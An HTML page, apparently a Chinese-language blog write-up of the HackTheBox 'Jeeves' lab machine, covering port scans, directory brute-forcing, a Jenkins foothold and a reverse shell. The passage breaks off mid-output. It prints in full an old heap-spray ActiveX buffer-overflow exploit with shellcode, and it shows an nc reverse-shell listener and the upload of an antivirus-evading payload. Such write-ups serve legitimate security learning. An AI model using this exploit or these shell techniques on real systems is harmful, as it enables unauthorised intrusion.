@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CrazyInSide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:12345678Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.63 [sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-08-29 13:53:52 GMTInit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Jeeves">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Jeeves/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon:12345678Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.63 [sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-08-29 13:53:52 GMTInit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/Jeeves.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829220118485.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829221344768.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829223138811.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829223342514.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829223415115.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829224837329.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829230924982.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829230958994.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829231237892.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220829231408472.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.869Z">
+<meta property="article:modified_time" content="2022-08-29T15:45:21.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/Jeeves.png">
+  
+  
+  
+  <title>HackTheBox-Jeeves - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Jeeves"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          124 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Jeeves</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://www.worldisend.com/img/Jeeves.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="Jeeves"></p>
+<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.63 <br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 13:53:52 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 445/tcp on 10.10.10.63                                    <br>Discovered open port 80/tcp on 10.10.10.63                                     <br>Discovered open port 135/tcp on 10.10.10.63   <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.63 -Pn -p445,80,135<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 21:57 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.63<br>Host is up (0.11s latency).<br><br>PORT    STATE SERVICE      VERSION<br>80/tcp  open  http         Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Ask Jeeves<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>135/tcp open  msrpc        Microsoft Windows RPC<br>445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br>Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-security-mode: <br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-08-29T18:57:15<br>|_  start_date: 2022-08-29T18:53:39<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 47.97 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.63 -Pn -p445,80,135<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ curl -I http://10.10.10.63/                                                                                             <br>HTTP/1.1 200 OK<br>Content-Length: 503<br>Content-Type: text/html<br>Last-Modified: Mon, 06 Nov 2017 02:34:40 GMT<br>Accept-Ranges: bytes<br>ETag: <span class="hljs-string">&quot;2277f7cba756d31:0&quot;</span><br>Server: Microsoft-IIS/10.0<br>Date: Mon, 29 Aug 2022 18:57:31 GMT<br></code></pre></td></tr></table></figure>
+
+<p>假搜索框：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829220118485.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829220118485"></p>
+<p>根本就不会像后端提交任何数据，而是无论输入什么都会跳转到一个错误信息的图片。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ dirsearch -u http://10.10.10.63 <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.63/_22-08-29_22-01-29.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-29_22-01-29.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.63/<br><br>[22:01:29] Starting: <br>[22:01:30] 403 -  312B  - /%2e%2e//google.com<br>[22:01:56] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[22:02:39] 200 -   50B  - /error.html<br>[22:02:50] 200 -  503B  - /index.html<br></code></pre></td></tr></table></figure>
+
+<p>但也没有一些目录信息。搜索漏洞会有一个溢出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ searchsploit Jeeves           <br>----------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                       |  Path<br>----------------------------------------------------------------------------------------------------- ---------------------------------<br>Ask.com/AskJeeves Toolbar Toolbar 4.0.2.53 - ActiveX Remote Buffer Overflow                          | windows/remote/4452.html<br>----------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> 4452.html <br>&lt;html&gt;<br><br>&lt;SCRIPT language=<span class="hljs-string">&quot;javascript&quot;</span>&gt;<br><br>// This is new technique I invent call <span class="hljs-string">&#x27;heap fill attack&#x27;</span><br><br>var str0ke = 0x0d0d0d0d;<br><br>var sucks = unescape( // Launch the system calculator 100 <span class="hljs-built_in">times</span> because what <span class="hljs-keyword">else</span>?<br><br>                      // This code currently not work on Solaris/Sparc<br><br>        <span class="hljs-string">&quot;%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120&quot;</span> +<br><br>        <span class="hljs-string">&quot;%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424&quot;</span> +<br><br>        <span class="hljs-string">&quot;%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304&quot;</span> +<br><br>        <span class="hljs-string">&quot;%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0&quot;</span> +<br><br>        <span class="hljs-string">&quot;%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A&quot;</span> +<br><br>        <span class="hljs-string">&quot;%uFF57%u63E7%u6C61%u0063&quot;</span>);<br><br>var dick = 0x400000;<br><br>var j0hnson = sucks.length * 2;<br><br>var spraySlideSize = dick - (j0hnson+0x38);<br><br>var spraySlide = unescape(<span class="hljs-string">&quot;%u9090%u9090&quot;</span>);<br><br>spraySlide = getSpraySlide(spraySlide,spraySlideSize);<br><br>heapBlocks = (str0ke - 0x400000)/dick;<br><br>memory = new Array();<span class="hljs-keyword">for</span> (i=0;i&lt;heapBlocks;i++)<br><br>&#123;memory[i] = spraySlide + sucks;&#125;<br><br>try&#123;<br><br>gadi = new ActiveXObject( <span class="hljs-string">&#x27;AskJeevesToolBar.SettingsPlugin.1&#x27;</span> );<br><br>&#125;<br><br>catch(evron)<br><br>&#123;<br><br>alert(evron);<br><br>&#125;<br><br>netdev = <span class="hljs-string">&quot;A&quot;</span>;<br><br><span class="hljs-keyword">while</span> (netdev.length != 0x5e0)<br><br>netdev += <span class="hljs-string">&quot;A&quot;</span>;<br><br>netdev += unescape(<span class="hljs-string">&quot;%0d%0d%0d%0d&quot;</span>);<br><br>gadi.ShortFormat = netdev;<br><br><span class="hljs-keyword">function</span> getSpraySlide(spraySlide, spraySlideSize)<br><br>        &#123;<span class="hljs-keyword">while</span> (spraySlide.length*2&lt;spraySlideSize)&#123;<br><br>        spraySlide += spraySlide;&#125;<br><br>        spraySlide = spraySlide.substring(0,spraySlideSize/2);<br><br>        <span class="hljs-built_in">return</span> spraySlide;&#125;<br><br>&lt;/script&gt;<br><br>&lt;/html&gt;<br><br><span class="hljs-comment"># milw0rm.com [2007-09-24]                                                                                                                                       </span><br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure>
+
+<p>这看起来对我没什么用。我重新进行了端口扫描，因为masscan漏扫是常有的事：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.63 -Pn -p-    <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 22:07 CST<br>Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 27.49% <span class="hljs-keyword">done</span>; ETC: 22:12 (0:03:42 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> jeeves.htb (10.10.10.63)<br>Host is up (0.13s latency).<br>Not shown: 65531 filtered tcp ports (no-response)<br>PORT      STATE SERVICE      VERSION<br>80/tcp    open  http         Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Ask Jeeves<br>135/tcp   open  msrpc        Microsoft Windows RPC<br>445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br>50000/tcp open  http         Jetty 9.4.z-SNAPSHOT<br>|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>|_http-title: Error 404 Not Found<br>Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-08-29T19:11:12<br>|_  start_date: 2022-08-29T18:53:39<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 249.71 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.63 -Pn -p-<br></code></pre></td></tr></table></figure>
+
+<p>这不像是HTB内部的链接：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829221344768.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829221344768"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,asp,aspx<br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.10.63<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Extensions:              html,php,asp,aspx<br>[+] Timeout:                 10s<br>===============================================================<br>2022/08/29 22:15:38 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 503]<br>/askjeeves			  (Status: 302)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220829223138811.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829223138811"></p>
+<p><img src="https://www.worldisend.com/img/image-20220829223342514.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829223342514"></p>
+<p><img src="https://www.worldisend.com/img/image-20220829223415115.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829223415115"></p>
+<p>有杀软的：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829224837329.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829224837329"></p>
+<p>我选择用SMB给它传个免杀载荷：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829230924982.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829230924982"></p>
+<p><img src="https://www.worldisend.com/img/image-20220829230958994.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829230958994"></p>
+<p>不知道什么原因失败了：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829231237892.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829231237892"></p>
+<p>看来得找时间去学习研究一下powershell 的免杀了：</p>
+<p><img src="https://www.worldisend.com/img/image-20220829231408472.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220829231408472"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.2] from (UNKNOWN) [10.10.10.63] 49677<br><span class="hljs-built_in">ls</span><br>PS C:\Users\Administrator\.jenkins\workspace\<span class="hljs-built_in">test</span>&gt; <span class="hljs-built_in">ls</span><br>PS C:\Users\Administrator\.jenkins\workspace\<span class="hljs-built_in">test</span>&gt; <br></code></pre></td></tr></table></figure>
+
+<p>不知道为什么不上线cs：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\ProgramData&gt; cmd /c <span class="hljs-string">&quot;start /b .\code.exe&quot;</span><br>PS C:\ProgramData&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\ProgramData<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----       10/30/2015   3:24 AM                Comms                                                                 <br>d---s-        11/5/2017   9:15 PM                Microsoft                                                             <br>d-----       10/25/2017   4:51 PM                Microsoft OneDrive                                                    <br>d-----        11/3/2017  10:27 PM                Oracle                                                                <br>d-----       10/30/2015   5:07 AM                regid.1991-06.com.microsoft                                           <br>d-----       10/30/2015   3:24 AM                SoftwareDistribution                                                  <br>d-----       10/25/2017   4:44 PM                USOPrivate                                                            <br>d-----       10/25/2017   4:44 PM                USOShared                                                             <br>da----       10/25/2017   4:49 PM                VMware                                                                <br>-a----        8/29/2022  11:06 AM          12800 code.exe                                                              <br><br><br>PS C:\ProgramData&gt; .\code.exe<br>PS C:\ProgramData&gt; <br></code></pre></td></tr></table></figure>
+
+<p>user.txt:</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bat">PS C:\Users\kohsuke&gt; <span class="hljs-built_in">cd</span> Desktop<br>PS C:\Users\kohsuke\Desktop&gt; ls<br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">    Directory: <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Mode</span>                <span 